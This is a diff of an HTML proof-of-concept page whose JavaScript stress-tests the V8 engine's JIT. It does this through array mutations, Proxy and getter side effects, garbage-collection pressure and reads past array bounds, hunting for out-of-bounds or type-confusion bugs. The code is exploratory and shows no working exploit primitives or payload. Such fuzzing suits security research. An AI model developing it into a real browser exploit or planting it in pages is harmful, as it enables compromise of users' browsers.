@@ -1,8 +1,8 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>V8 Near-OOB Stress PoC</title>
+<title>V8 Aggressive Near-OOB PoC</title>
 
-<h2>V8 Near-OOB PoC</h2>
+<h2>V8 Aggressive Near-OOB PoC</h2>
 <pre id="log"></pre>
 
 <script>
@@ -22,7 +22,7 @@ function target(a,i){ return a[i]+1.1; }
 // =======================
 function warmup(){
     let arr = Array.from({length:50}, (_,i)=>i+0.5);
-    for(let j=0;j<100000;j++){
+    for(let j=0;j<150000;j++){
         vuln(arr,j%50);
         target(arr,j%50);
     }
@@ -30,15 +30,15 @@ function warmup(){
 }
 
 // =======================
-// AGGRESSIVE MUTATION NEAR-OOB
+// AGGRESSIVE MUTATION
 // =======================
 function mutate(arr){
-    delete arr[5];
-    arr.length = 20;
-    arr[60] = 13.37;
-    arr[4] = {x:1};
+    for(let i=0;i<10;i++) delete arr[i]; // lebih banyak holes
+    arr.length = 10;
+    arr[70] = 1.7976931348623157e+308; // max float64
+    arr[2] = {x:1};
     Object.defineProperty(arr,3,{
-        get(){ arr.push(99.9); return 1.1; }
+        get(){ arr.push(Math.random()*1e5); return 1.1; }
     });
     return arr;
 }
@@ -46,12 +46,12 @@ function mutate(arr){
 function breakAssumption(a){
     a = new Proxy(a,{
         get(t,p){
-            if(p==="length") t.push(13.37);
-            if(typeof p==="string" && !isNaN(p) && Math.random()<0.2) t.push(42.42);
+            if(p==="length") for(let i=0;i<5;i++) t.push(Math.random()*1e5);
+            if(typeof p==="string" && !isNaN(p) && Math.random()<0.5) t.push(Math.random()*1e5);
             return Reflect.get(t,p);
         },
         set(t,p,v){
-            if(Math.random()<0.1) t.length += 3;
+            if(Math.random()<0.2) t.length += 5;
             return Reflect.set(t,p,v);
         }
     });
@@ -61,7 +61,7 @@ function breakAssumption(a){
 // =======================
 // TYPED ARRAYS
 // =======================
-let buf = new ArrayBuffer(0x2000);
+let buf = new ArrayBuffer(0x4000);
 let f64 = new Float64Array(buf);
 let u32 = new Uint32Array(buf);
 let u8  = new Uint8Array(buf);
@@ -71,14 +71,14 @@ let u8  = new Uint8Array(buf);
 // =======================
 function gcPressure(){
     let t=[];
-    for(let i=0;i<100;i++) t.push(new ArrayBuffer(1024*1024));
+    for(let i=0;i<200;i++) t.push(new ArrayBuffer(1024*1024));
 }
 
 // =======================
 // CHECKS NEAR-OOB
 // =======================
 function checkArray(a){
-    for(let i=0;i<a.length+50;i++){
+    for(let i=0;i<a.length+100;i++){
         let v = a[i];
         if(typeof v!=="number" && typeof v!=="object" && v!==undefined){
             log("TYPE BREAK "+i+" "+v); return true;
@@ -87,8 +87,8 @@ function checkArray(a){
             log("POINTER LIKE "+v); return true;
         }
     }
-    if(a[a.length+10]!==undefined){
-        log("⚠ NEAR-OOB READ index "+(a.length+10)+" val="+a[a.length+10]);
+    if(a[a.length+20]!==undefined){
+        log("NEAR-OOB READ index "+(a.length+20)+" val="+a[a.length+20]);
         return true;
     }
     return false;
@@ -110,8 +110,8 @@ function run(){
     log("[*] warmup / JIT");
     let base = warmup();
 
-    log("[*] starting near-OOB fuzzing...");
-    for(let i=0;i<100000;i++){
+    log("[*] starting aggressive near-OOB fuzzing...");
+    for(let i=0;i<200000;i++){
         let arr = [...base];
         arr = mutate(arr);
         arr = breakAssumption(arr);
@@ -119,14 +119,14 @@ function run(){
         vuln(arr,5);
         target(arr,4);
 
-        f64[i % f64.length] = i+0.5;
-        u32[i % u32.length] = i;
-        u8[i % u8.length] = i & 0xff;
+        f64[i % f64.length] = 1.7976931348623157e+308; // high float
+        u32[i % u32.length] = 0xffffffff;
+        u8[i % u8.length] = 0xff;
 
-        if(i%20===0) gcPressure();
+        if(i%10===0) gcPressure();
 
-        if(checkArray(arr)){ log("⚠ ARRAY NEAR-OOB BREAK"); return; }
-        if(checkTyped()){ log("⚠ TYPED ARRAY CORRUPTION"); return; }
+        if(checkArray(arr)){ log("ARRAY NEAR-OOB BREAK"); return; }
+        if(checkTyped()){ log("TYPED ARRAY CORRUPTION"); return; }
         if(i%500===0) log("iter "+i);
     }
     log("[*] finished");
